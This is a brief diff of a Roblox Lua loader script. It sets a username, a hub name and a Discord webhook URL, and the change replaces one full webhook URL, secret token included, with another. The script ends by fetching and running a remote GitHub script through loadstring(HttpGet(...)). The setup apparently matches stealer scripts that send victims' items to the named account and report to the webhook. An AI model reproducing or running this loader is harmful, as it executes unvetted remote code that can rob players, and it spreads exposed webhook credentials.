@@ -1,5 +1,5 @@
 _G.Username = "MyIqIsLow3rThanMyAge"
 _G.HubName = "ZlyLinoHub"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1095371921727696946/AjJkvYQDo0vyc2PUQ6Bzcmzsf2FgjeOV83ULfVGDV6CaYPLYzbzxLwTSKuCEaoLNjjx7"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1095405615188287518/n05RS7gaCBnfXAHAOic-xze2c_3XxO46kqoL60zj0d_dBCy_3XBW3ipbp1_i7ZTnQStx"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
